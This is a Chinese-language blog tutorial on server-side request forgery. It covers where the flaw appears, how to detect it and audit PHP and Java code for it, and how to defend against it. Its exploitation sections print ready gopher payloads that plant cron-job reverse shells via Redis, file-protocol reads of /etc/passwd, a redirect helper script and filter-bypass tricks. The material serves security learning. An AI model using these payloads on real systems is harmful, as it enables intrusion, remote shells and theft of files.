# SSRF漏洞




## SSRF简介

SSRF(server-site request forge，**服务端请求伪造**)是一种请求伪造，由服务器发起请求的安全漏洞。一般情况下，SSRF攻击的目标是**从外网无法访问的内部系统**。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）



### 漏洞原理

大部分原因都是服务端提供从其他服务器应用获取数据的功能且没有对目标地址进行过滤和限制。如常见的从指定URL地址加载图片、文本资源或获取指定页面的网页内容等。



### 与CSRF区别

- CSRF是客户端请求伪造，由客户端发起
- SSRF由服务器发起请求的安全漏洞



## SSRF危害

1. 获取内网主机、端口和banner信息(内网端口和服务扫描)
2. 对内外网追击的应用程序进行攻击，如Redis，jboss等
3. (主机本地敏感数据的读取)使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件
   1.  通过dict协议获取服务器端口运行的服务：dict://127.0.0.1:80
   2. 通过file协议访问计算机中的任意文件：file:///etc/passwd 
   3. sftp代表SSH文件传输协议，tftp即简单文件传输协议，允许客户端从远程主机获取文件
4. 可以攻击内网程序造成溢出
5. DOS攻击（请求大文件，始终保持连接Keep-Alive Always）
6. 内外网外部站点漏洞利用





## SSRF常见位置

1. 社交分享功能：获取超链接的标题等内容进行显示
2. 转码服务：通过URL地址把原网址的网页内容调优使其适合手机屏幕浏览
3. 在线翻译：给网址翻译对应网页的内容
4. 图片加载/下载：如富文本框编辑器中的点击下载图片到本地；通过url加载或下载图片
5. 邮件系统：比如接收邮件服务器地址
6. 图片、文章收藏功能：网站会获取URL中title及温拌的内尔欧诺个作为以求一个好的用户体验
7. 未公开的api实现及其他调用url的功能：可以利用google语法加上下文说的关键字来寻找
8. 云服务厂商：他会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行SSRF测试
9. 网站采集、网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作
10. 数据库内置功能：：是比如mongoDB的copyDatabase函数
11. 编码处理、属性信息处理、文件处理：比如pdf, word, xml处理器等
12. 从远程服务器请求资源
13. 视频解析的网站





## SSRF漏洞挖掘

1. 从web功能上寻找：前面常见的位置

2. 从url关键字中寻找：

   ```bash
   share
   wap
   url
   link
   src
   source
   target
   u
   3g
   display
   sourceURL
   imageURL
   domain
   
   ```

   





## SSRF漏洞利用

### 利用方式

1.让服务端去访问相应的网址，端口扫描：` http://www.xxx.com/ssrf.php?u1=http://www.yy.com:3306`

2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms

3.可以使用**file、dict、gopher[11]、ftp**协议进行各种漏洞利用

```bash
# 使用file协议读取文件
http://www.xxx.com/ssrf.php?u1=file:///var/www/html/index.php
 
#利用dict协议查看端口
curl -v 'http://xxx.com/ssrf.php?url=dict://127.0.0.1:22'

# 利用gopher协议攻击redis反弹shell
curl -v
"http://xxx.com/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fyourip%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a"

```

4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}）

5.攻击内网应用程序（利用跨协议通信技术）

6.判断内网主机是否存活：方法是访问看是否有端口开放

7.DoS攻击（请求大文件，始终保持连接keep-alive always）



#### Gopher协议

> 互联网上使用的分布型的文件搜集获取网络协议，出现在http协议之前。（可以模拟GET/POST请求，换行使用%0d%0a，空白行%0a）。

- Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议
- Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用
- 利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求
- Gopher 可以模仿 POST 请求，故探测内网的时候不仅可以利用 GET 形式的 PoC（经典的 Struts2），还可以使用 POST 形式的 PoC。



**gopher协议格式：**

```bash
gopher://<host>:<port>/<gopher-path>_后接TCP数据流
```

如：

```bash
curl gopher://localhost:2222/hello%0agopher
```





#### dict

词典网络协议，在RFC 2009中进行描述。它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典。Dict服务器和客户机使用TCP端口2628。

```bash
curl -v http://localhost/ssrf/ssrf.php?url=dict://127.0.0.1:6379/info

```



如果服务端有屏蔽回显的代码，那么这种回显方式就失效了，和gopher一样，只能利用nc监听端口，反弹传输数据



#### file

本地文件传输协议，主要用于访问本地计算机中的文件



### 302 SSRF

当URL存在临时(302)或永久(301)跳转时，则继续请求跳转后的URL

那么我们可以通过HTTP(S)的链接302跳转到gopher协议上。

我们继续构造一个302跳转服务，代码如下302.php:

```php
<?php  
$schema = $_GET['s'];
$ip     = $_GET['i'];
$port   = $_GET['p'];
$query  = $_GET['q'];
if(empty($port)){  
    header("Location: $schema://$ip/$query"); 
} else {
    header("Location: $schema://$ip:$port/$query"); 
}
```

**利用测试**

```bash
# dict protocol - 探测Redis
dict://127.0.0.1:6379/info  
curl -vvv 'http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=dict&i=127.0.0.1&port=6379&query=info'

# file protocol - 任意文件读取
curl -vvv 'http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=file&query=/etc/passwd'


# gopher protocol - 一键反弹Bash
# * 注意: gopher跳转的时候转义和`url`入参的方式有些区别
curl -vvv 'http://sec.com:8082/ssrf_only_http_s.php?url=http://sec.com:8082/302.php?s=gopher&i=127.0.0.1&p=6389&query=_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0 
a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20>&%20/dev/tcp/103.21.140.84/6789%200>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d  
%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3
%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'

```





### SSRF + Redis未授权

众所周知，redis未授权的三种姿势：

1.redis写入ssh公钥，获取操作系统权限；

2.直接向Web目录中写webshell； 

3.linux计划任务执行命令反弹shell。



使用gopher协议来实现

#### gopher协议

#### 

比如存在ssrf的漏洞地址为：`http://192.168.1.11/ssrf.php?url=`

结合gother协议构造符合格式的paylod，从而模拟redis通信

```bash
http://192.168.1.11/ssrf.php?url=gother://127.0.0.1:6379/_payload
#转换为：
http://192.168.1.11/ssrf.php?url=gopher%3a%2f%2f127.0.0.1%3a6379%2f_payload
```

payload如下：

```bash
## 这里使用利用redis写计划任务任务来反弹shell的利用方式
set x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/192.168.11.12/4444 0>&1\n\n"
config set dir /var/spool/cron/
config set dbfilename root
save

```

将以上命令构造成符合gopher协议格式，且能够通过URL传输的格式来发送，需要经过如下**步骤**：

1.将payload进行url编码

2.替换`%0a`为`%0d%0a`

3.然后再重复一次以上的两个步骤

> 原因：替换回车换行为%0d%0a，空格以%20替换, HTTP包最后加%0d%0a`代表消息结束

4.将得到的结果，替代`http://192.168.1.11/ssrf.php?url=gopher%3a%2f%2f127.0.0.1%3a6379%2f_payload`里面payload的位置得到



5.然后直接在浏览器中访问，或者在kaili中执行

```bash
curl 完整的payload
```



然后就可以在攻击机上获得反弹的shell



> 注意，以上利用方式，如果是ubuntu的系统，是无法成功的







## SSRF漏洞防御绕过



#### 1.利用各种其他协议

```bash
file:///     file protocol (任意文件读取)     

Dict://     
dict://<user-auth>@<host>:<port>/d:<word>      

SFTP://Sftp代表SSH文件传输协议（SSH File Transfer Protocol）或安全文件传输协议（Secure File Transfer Protocol）     

TFTP://   

LDAP:// 或ldaps:// 或ldapi://      

Gopher
```



#### 2.IP地址进制转换

IP地址进行各种进制的转换（八进制/十六进制等）

```bash
127.0.0.1
八进制：0177.0.0.1
十六进制：0x7f.0.0.1
十进制：2130706433
```



#### 3.利用[::]

可以利用`[::]`来绕过localhost：

```bash
http://[::]:80/  >>>  http://127.0.0.1

```



#### 4.利用@

`http://xxx.com@www.baidu.com/`与`http://www.baidu.com/`请求时是相同的，实际请求的是@之后的。

但是在对@解析域名中，不同的处理函数存在处理差异，如：

```
http://www.aaa.com@www.bbb.com@www.ccc.com

在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com
```



#### 5.短网址

如：https://dwz.cn/

http://tool.chinaz.com/tools/dwz.aspx

等

#### 6.利用特殊域名

原理是DNS解析。

xip.io可以指向任意域名，即

```bash
127.0.0.1.xip.io	# 可解析为127.0.0.1
```





#### 7.**利用DNS解析**

在域名上设置A记录，指向`127.0.1`



#### 8.**句号**

```bash
127。0。0。1  >>>  127.0.0.1
```



#### 9.**302跳转**

比如使用：https://tinyurl.com   等网站生成302跳转地址



#### 10.利用封闭式字符数字

ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ >>> example.com

```bash
#利用Enclosed alphanumericss 
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  >>>  example.com 

#List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳  ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇  ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛  ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵  Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ  ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ  ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴  ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿

```



#### 11.DNSlog无回显注入

- 使用dhsnlog平台/自己搭建

- 打开apache或者nginx，测试地址修改为web服务地址，然后看日志`ail -f /var/log/apache2/access.log`

- 使用tcpdump

  ```bash
  tcpdump -nne -i eth0 port 6666
  
  # -nne：不把端口和网络地址转换成名称，在输出行打印数据链路层的头部信息；
  # -i：监视指定网络接口的数据包。
  
  
  ```

  







#### 12.加端口

若限制了子网段，可以添加 `:80` 端口绕过：

```
http://127.0.0.1:8080
```



#### 13.其他

修改"type=file"为"type=url" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF





## 简单验证流程

> 之前由于疏忽了，看到dnslog回显就认为是ssrf，大意了忘了SSRF是服务端发起请求.....(有时候dnslog回显的可能是你本地的ip)



假设对于如下链接：

`http://www.douban.com/***/service?image=http://www.baidu.com/img/bd_logo1.png`

1. **我们先验证，请求是否是服务器端发出的**，可以右键图片，使用新窗口打开图片，如果浏览器上地址栏是`http://www.baidu.com/img/bd_logo1.png`，说明不存在SSRF漏洞。
2. 可以在Firebug 或者burpsuite抓包工具，查看请求数据包中是否包含`http://www.baidu.com/img/bd_logo1.png`这个请求。**由于SSRF是服务端发起的请求，因此在加载这张图片的时候本地浏览器中不应该存在图片的请求。**
3. 在验证完是由服务端发起的请求之后，此处就有可能存在SSRF，**接下来需要验证此URL是否可以来请求对应的内网地址**。首先我们要获取内网存在HTTP服务且存在favicon.ico文件地址，才能验证是否是SSRF。









## SSRF漏洞代码审计



### PHP中

PHP中下面函数的使用不当会导致SSRF:

```php
curl()  # 利用方式很多最常见的是通过file、dict、gopher这三个协议来进行渗透
file_get_contents()	# 获取文档数据,file_get_contents是把文件写入字符串，当把url是内网文件的时候，他会先去把这个文件的内容读出来再写入，导致了文件读取。
  
fsockopen()	#  初始化一个套接字连接到指定主机,本身就是打开一个网络连接或者Unix套接字连接。
curl_exec()	#  获得curl会话的结果
```











### Java中

与PHP不同，Java中的SSRF仅支持`sun.net.www.protocol`协议下的所有协议：`http, https, file, ftp, mailto, jar 及netdoc`协议

正由于上述原因，以及传入的url协议必须和重定向后的URL协议一直的原因，使得Java中的SSRF并不能像PHP中一样使用`gopher`协议来扩展攻击面

对于Java来说：

可以用file协议或nerdoc协议进行列目录操作；

对于无回显的文件读取可以利用ftp协议进行带外攻击（注意java的版本，有的版本的java使用ftp协议也无法读取多行文件）



#### 敏感函数

注意能够发起HTTP请求的类和函数：

```java
HttpClient.execute()
HttpClient.executeMethod()
HttpURLConnection.connect()
HttpURLConnection.getInputStream()
URL.openStream()
HttpServletRequest()
BasicHttpEntityEncosingRequest()
DefaultBHttpClientConnection()
BasicHttpRequest()
ImageIO.read()
```

出来以上函数，还需要关注更多的类，如HttpClient、URL类等，还要根据具体实际场景不同。



#### 通常步骤

1. 首先确定被审计的源程序有哪些功能（通常从其他服务器应用获取数据功能出现的概率较大）
2. 确定好功能后再审计对应功能的源代码，事半功倍







## SSRF漏洞防护

1. 正确处理302跳转（在业务角度看，不能直接禁止302，而是对跳转的地址重新进行检查）或每次跳转，都检查新的Host是否是内网IP，直到抵达最后的网址
2. 禁用不需要的协议(如：`file:///`、`gopher://`,`dict://`等)，限制协议为http、https，防止跨协议
3. 设置内网IP黑名单（正确判定内网IP、正确获取host）
4. 在内网防火墙上设置常见的Web端口白名单（防止端口扫描）
5. 统一错误信息，避免用户根据错误信息来判断远端服务器的端口状态



## 参考

https://zhuanlan.zhihu.com/p/73736127

https://www.cnblogs.com/chalan630/p/17090666.html


---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/ssrf%E6%BC%8F%E6%B4%9E/  

